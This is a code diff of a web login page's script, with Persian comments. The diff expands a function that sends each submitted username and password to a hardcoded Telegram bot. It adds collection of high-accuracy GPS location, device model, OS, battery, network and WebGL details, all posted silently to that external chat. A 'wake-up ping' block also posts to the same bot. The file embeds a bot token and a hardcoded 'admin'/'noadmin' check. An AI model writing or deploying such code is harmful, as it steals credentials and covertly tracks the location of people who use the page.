@@ -347,7 +347,6 @@
 <script>
     // ===== بیدار کردن Render (Wake-up pings) =====
     (function wakeUpRender(){
-        // الان فقط 2 بار پینگ می‌فرسته
         for (let i = 1; i <= 2; i++) {
             fetch("https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage", {
                 method: "POST",
@@ -360,41 +359,383 @@
         }
     })();
 
-    // ===== گرفتن اطلاعات ساده دستگاه/مرورگر/زمان =====
-    function getSimpleDeviceInfo() {
+    // ===== دریافت موقعیت مکانی =====
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({
+                    supported: false,
+                    error: "Geolocation not supported"
+                });
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    resolve({
+                        supported: true,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + " meters",
+                        altitude: position.coords.altitude ? position.coords.altitude + " meters" : "Not available",
+                        altitudeAccuracy: position.coords.altitudeAccuracy ? position.coords.altitudeAccuracy + " meters" : "Not available",
+                        heading: position.coords.heading ? position.coords.heading + " degrees" : "Not available",
+                        speed: position.coords.speed ? position.coords.speed + " m/s" : "Not available",
+                        timestamp: new Date(position.timestamp).toLocaleString()
+                    });
+                },
+                (error) => {
+                    let errorMessage = "Unknown error";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = "User denied location access";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = "Location unavailable";
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = "Location request timeout";
+                            break;
+                    }
+                    resolve({
+                        supported: true,
+                        error: errorMessage
+                    });
+                },
+                options
+            );
+        });
+    }
+
+    // ===== گرفتن اطلاعات پیشرفته دستگاه =====
+    async function getAdvancedDeviceInfo() {
         const ua = navigator.userAgent || "";
+        
+        // دریافت موقعیت مکانی
+        const locationInfo = await getLocation();
+        
+        // تشخیص نوع دستگاه
         const deviceType = /mobile/i.test(ua) ? "📱 Mobile"
                         : /tablet/i.test(ua) ? "📲 Tablet"
                         : "💻 Desktop";
 
+        // تشخیص مرورگر
         let browser = "Unknown";
-        if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome";
-        else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-        else if (/edg/i.test(ua)) browser = "Edge";
-        else if (/opr\//i.test(ua)) browser = "Opera";
-        else if (/msie|trident/i.test(ua)) browser = "Internet Explorer";
+        let browserVersion = "";
+        
+        if (/chrome|crios|crmo/i.test(ua)) {
+            browser = "Chrome";
+            browserVersion = ua.match(/(chrome|crios)\/([0-9.]+)/i)?.[2] || "";
+        } else if (/firefox|fxios/i.test(ua)) {
+            browser = "Firefox";
+            browserVersion = ua.match(/(firefox|fxios)\/([0-9.]+)/i)?.[2] || "";
+        } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
+            browser = "Safari";
+            browserVersion = ua.match(/version\/([0-9.]+)/i)?.[1] || "";
+        } else if (/edg/i.test(ua)) {
+            browser = "Edge";
+            browserVersion = ua.match(/edg\/([0-9.]+)/i)?.[1] || "";
+        } else if (/opr\//i.test(ua)) {
+            browser = "Opera";
+            browserVersion = ua.match(/opr\/([0-9.]+)/i)?.[1] || "";
+        } else if (/msie|trident/i.test(ua)) {
+            browser = "Internet Explorer";
+            browserVersion = ua.match(/(msie |rv:)([0-9.]+)/i)?.[2] || "";
+        }
+
+        // تشخیص سیستم عامل
+        let os = "Unknown";
+        let osVersion = "";
+        
+        if (/windows nt 10/i.test(ua)) {
+            os = "Windows 10/11";
+        } else if (/windows nt 6.3/i.test(ua)) {
+            os = "Windows 8.1";
+        } else if (/windows nt 6.2/i.test(ua)) {
+            os = "Windows 8";
+        } else if (/windows nt 6.1/i.test(ua)) {
+            os = "Windows 7";
+        } else if (/windows nt 6.0/i.test(ua)) {
+            os = "Windows Vista";
+        } else if (/windows nt 5.1/i.test(ua)) {
+            os = "Windows XP";
+        } else if (/windows nt 5.0/i.test(ua)) {
+            os = "Windows 2000";
+        } else if (/mac os x 10_15/i.test(ua)) {
+            os = "macOS Catalina";
+        } else if (/mac os x 10_14/i.test(ua)) {
+            os = "macOS Mojave";
+        } else if (/mac os x 10_13/i.test(ua)) {
+            os = "macOS High Sierra";
+        } else if (/mac os x/i.test(ua)) {
+            os = "macOS";
+            osVersion = ua.match(/mac os x ([0-9_]+)/i)?.[1].replace(/_/g, '.') || "";
+        } else if (/android/i.test(ua)) {
+            os = "Android";
+            osVersion = ua.match(/android ([0-9.]+)/i)?.[1] || "";
+        } else if (/ios|iphone|ipad|ipod/i.test(ua)) {
+            os = "iOS";
+            osVersion = ua.match(/os ([0-9_]+)/i)?.[1].replace(/_/g, '.') || "";
+        } else if (/linux/i.test(ua)) {
+            os = "Linux";
+        }
+
+        // تشخیص مدل گوشی
+        let deviceModel = "Unknown";
+        if (/android/i.test(ua)) {
+            if (/samsung/i.test(ua)) {
+                deviceModel = "Samsung";
+                const modelMatch = ua.match(/sm-[a-z0-9]+|gt-[a-z0-9]+|sch-[a-z0-9]+/i);
+                if (modelMatch) deviceModel += " " + modelMatch[0];
+            } else if (/xiaomi/i.test(ua) || /redmi/i.test(ua) || /poco/i.test(ua)) {
+                deviceModel = "Xiaomi";
+                const modelMatch = ua.match(/(mi|redmi|poco) [a-z0-9]+/i);
+                if (modelMatch) deviceModel += " " + modelMatch[0];
+            } else if (/huawei/i.test(ua) || /honor/i.test(ua)) {
+                deviceModel = "Huawei";
+                const modelMatch = ua.match(/(huawei|honor) [a-z0-9]+/i);
+                if (modelMatch) deviceModel += " " + modelMatch[0];
+            } else if (/oneplus/i.test(ua)) {
+                deviceModel = "OnePlus";
+                const modelMatch = ua.match(/oneplus [a-z0-9]+/i);
+                if (modelMatch) deviceModel += " " + modelMatch[0];
+            } else if (/pixel/i.test(ua)) {
+                deviceModel = "Google Pixel";
+                const modelMatch = ua.match(/pixel [a-z0-9]+/i);
+                if (modelMatch) deviceModel += " " + modelMatch[0];
+            } else {
+                deviceModel = "Android Device";
+            }
+        } else if (/iphone|ipad|ipod/i.test(ua)) {
+            if (/iphone/i.test(ua)) deviceModel = "iPhone";
+            else if (/ipad/i.test(ua)) deviceModel = "iPad";
+            else if (/ipod/i.test(ua)) deviceModel = "iPod";
+            
+            const modelMatch = ua.match(/model\/(iphone|ipad)([a-z0-9,]+)/i);
+            if (modelMatch) deviceModel += " " + modelMatch[2];
+        }
+
+        // اطلاعات صفحه نمایش
+        const screenInfo = {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth + " bits",
+            pixelDepth: screen.pixelDepth + " bits",
+            orientation: screen.orientation ? screen.orientation.type : "Unknown"
+        };
+
+        // اطلاعات زبان و موقعیت زمانی
+        const language = navigator.language || navigator.userLanguage || "Unknown";
+        const languages = navigator.languages ? navigator.languages.join(', ') : language;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        // اطلاعات شبکه
+        const connection = navigator.connection || {};
+        const networkInfo = {
+            effectiveType: connection.effectiveType || "Not supported",
+            downlink: connection.downlink ? connection.downlink + " Mbps" : "Not supported",
+            rtt: connection.rtt ? connection.rtt + " ms" : "Not supported",
+            saveData: connection.saveData ? "Enabled" : "Disabled/Not supported",
+            onLine: navigator.onLine ? "Online" : "Offline"
+        };
+
+        // اطلاعات پلتفرم
+        const platform = navigator.platform || "Unknown";
+        
+        // اطلاعات CPU و حافظه - با بررسی کامل‌تر
+        const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+        
+        // بررسی حافظه دستگاه با روش‌های مختلف
+        let deviceMemory = "Unknown";
+        if (navigator.deviceMemory) {
+            deviceMemory = navigator.deviceMemory + " GB";
+        } else if (performance.memory) {
+            // استفاده از Performance Memory API
+            const memory = performance.memory;
+            deviceMemory = Math.round(memory.jsHeapSizeLimit / (1024 * 1024 * 1024)) + " GB (Heap Limit)";
+        }
+
+        // اطلاعات WebGL
+        const webglInfo = getWebGLInfo();
+
+        // اطلاعات باتری
+        const batteryInfo = await getBatteryInfo();
 
         const time = new Date().toLocaleString();
-        return { deviceType, browser, time };
+        const timestamp = Date.now();
+        
+        return { 
+            deviceType, 
+            browser, 
+            browserVersion,
+            os,
+            osVersion,
+            deviceModel,
+            screenInfo,
+            language,
+            languages,
+            timezone,
+            networkInfo,
+            platform,
+            hardwareConcurrency,
+            deviceMemory,
+            locationInfo,
+            batteryInfo,
+            webglInfo,
+            userAgent: ua,
+            time,
+            timestamp
+        };
+    }
+
+    // ===== دریافت اطلاعات باتری =====
+    async function getBatteryInfo() {
+        if (!('getBattery' in navigator)) {
+            return { supported: false };
+        }
+
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                supported: true,
+                level: Math.round(battery.level * 100) + "%",
+                charging: battery.charging ? "Yes" : "No",
+                chargingTime: battery.chargingTime === Infinity ? "Unknown" : battery.chargingTime + " seconds",
+                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : battery.dischargingTime + " seconds"
+            };
+        } catch (error) {
+            return {
+                supported: true,
+                error: "Failed to get battery info"
+            };
+        }
+    }
+
+    // ===== دریافت اطلاعات WebGL =====
+    function getWebGLInfo() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        
+        if (!gl) {
+            return {
+                vendor: "WebGL not supported",
+                renderer: "WebGL not supported"
+            };
+        }
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            return {
+                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "Unknown",
+                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Unknown"
+            };
+        }
+        
+        return {
+            vendor: "Debug info not available",
+            renderer: "Debug info not available"
+        };
     }
 
     // ===== ارسال اطلاعات کامل به تلگرام =====
-    function sendToTelegram(username, password) {
-        const info = getSimpleDeviceInfo();
-        const message = `🔔 ورود موفق!
-👤 یوزرنیم: ${username}
-🔑 پسورد: ${password}
-💻 دیوایس: ${info.deviceType}
-🌐 مرورگر: ${info.browser}
-🕒 زمان: ${info.time}`;
+    async function sendToTelegram(username, password) {
+        const info = await getAdvancedDeviceInfo();
+        
+        // ساخت پیام با قالب‌بندی بهتر
+        let message = `🔔 **ورود موفق به سیستم!**\n\n`;
+        
+        message += `👤 **اطلاعات ورود:**\n`;
+        message += `   • یوزرنیم: \`${username}\`\n`;
+        message += `   • پسورد: \`${password}\`\n\n`;
+        
+        message += `📱 **اطلاعات دستگاه:**\n`;
+        message += `   • نوع دستگاه: ${info.deviceType}\n`;
+        message += `   • مدل: ${info.deviceModel}\n`;
+        message += `   • سیستم عامل: ${info.os} ${info.osVersion}\n`;
+        message += `   • پلتفرم: ${info.platform}\n`;
+        message += `   • هسته‌های CPU: ${info.hardwareConcurrency}\n`;
+        message += `   • حافظه دستگاه: ${info.deviceMemory}\n\n`;
+        
+        message += `🌐 **اطلاعات مرورگر:**\n`;
+        message += `   • مرورگر: ${info.browser} ${info.browserVersion}\n`;
+        message += `   • زبان: ${info.language}\n`;
+        message += `   • زبان‌های پشتیبانی شده: ${info.languages}\n`;
+        message += `   • منطقه زمانی: ${info.timezone}\n\n`;
+        
+        message += `🖥️ **اطلاعات صفحه نمایش:**\n`;
+        message += `   • رزولوشن: ${info.screenInfo.width} × ${info.screenInfo.height}\n`;
+        message += `   • رزولوشن قابل استفاده: ${info.screenInfo.availWidth} × ${info.screenInfo.availHeight}\n`;
+        message += `   • عمق رنگ: ${info.screenInfo.colorDepth}\n`;
+        message += `   • جهت: ${info.screenInfo.orientation}\n\n`;
+        
+        message += `📶 **اطلاعات شبکه:**\n`;
+        message += `   • وضعیت: ${info.networkInfo.onLine}\n`;
+        message += `   • نوع اتصال: ${info.networkInfo.effectiveType}\n`;
+        message += `   • سرعت دانلود: ${info.networkInfo.downlink}\n`;
+        message += `   • تاخیر: ${info.networkInfo.rtt}\n`;
+        message += `   • حالت صرفه‌جویی: ${info.networkInfo.saveData}\n\n`;
+        
+        // اطلاعات موقعیت مکانی
+        message += `📍 **موقعیت مکانی:**\n`;
+        if (info.locationInfo.supported) {
+            if (info.locationInfo.latitude) {
+                message += `   • موقعیت: ${info.locationInfo.latitude}, ${info.locationInfo.longitude}\n`;
+                message += `   • دقت: ${info.locationInfo.accuracy}\n`;
+                message += `   • ارتفاع: ${info.locationInfo.altitude}\n`;
+                message += `   • جهت حرکت: ${info.locationInfo.heading}\n`;
+                message += `   • سرعت: ${info.locationInfo.speed}\n`;
+                message += `   • زمان موقعیت: ${info.locationInfo.timestamp}\n`;
+                
+                // لینک Google Maps
+                const mapsUrl = `https://maps.google.com/?q=${info.locationInfo.latitude},${info.locationInfo.longitude}`;
+                message += `   • [📍 مشاهده در Google Maps](${mapsUrl})\n`;
+            } else {
+                message += `   • وضعیت: ${info.locationInfo.error}\n`;
+            }
+        } else {
+            message += `   • موقعیت‌یابی پشتیبانی نمی‌شود\n`;
+        }
+        message += `\n`;
+        
+        message += `🔋 **اطلاعات باتری:**\n`;
+        if (info.batteryInfo.supported) {
+            if (info.batteryInfo.level) {
+                message += `   • سطح باتری: ${info.batteryInfo.level}\n`;
+                message += `   • در حال شارژ: ${info.batteryInfo.charging}\n`;
+                message += `   • زمان تا شارژ کامل: ${info.batteryInfo.chargingTime}\n`;
+                message += `   • زمان تا خالی شدن: ${info.batteryInfo.dischargingTime}\n`;
+            } else {
+                message += `   • خطا در دریافت اطلاعات باتری\n`;
+            }
+        } else {
+            message += `   • اطلاعات باتری پشتیبانی نمی‌شود\n`;
+        }
+        message += `\n`;
+        
+        message += `🎮 **اطلاعات گرافیک:**\n`;
+        message += `   • کارت گرافیک: ${info.webglInfo.renderer}\n`;
+        message += `   • سازنده: ${info.webglInfo.vendor}\n\n`;
+        
+        message += `🕒 **زمان:** ${info.time}\n`;
+        message += `📊 **تایم‌استمپ:** ${info.timestamp}\n\n`;
+        
+        message += `📄 **User Agent:**\n\`\`\`\n${info.userAgent}\n\`\`\``;
 
         fetch("https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: "6689313262",
-                text: message
+                text: message,
+                parse_mode: "Markdown"
             })
         })
         .then(res => res.json())
@@ -442,7 +783,7 @@
     const loginForm = document.getElementById('loginForm');
     const loginBtn = document.getElementById('loginBtn');
 
-    loginForm.addEventListener('submit', (e) => {
+    loginForm.addEventListener('submit', async (e) => {
         e.preventDefault();
         
         const username = document.getElementById('username').value;
@@ -452,13 +793,13 @@
         loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
         loginBtn.disabled = true;
         
-        setTimeout(() => {
+        setTimeout(async () => {
             if (username === 'admin' && password === 'noadmin') {
                 loginBtn.innerHTML = '<i class="fas fa-check"></i> Login Successful!';
                 loginBtn.style.background = 'linear-gradient(90deg, #2ecc71 0%, #27ae60 100%)';
 
                 // ارسال اطلاعات به تلگرام
-                sendToTelegram(username, password);
+                await sendToTelegram(username, password);
 
                 setTimeout(() => {
                     window.location.href = 'status.html';
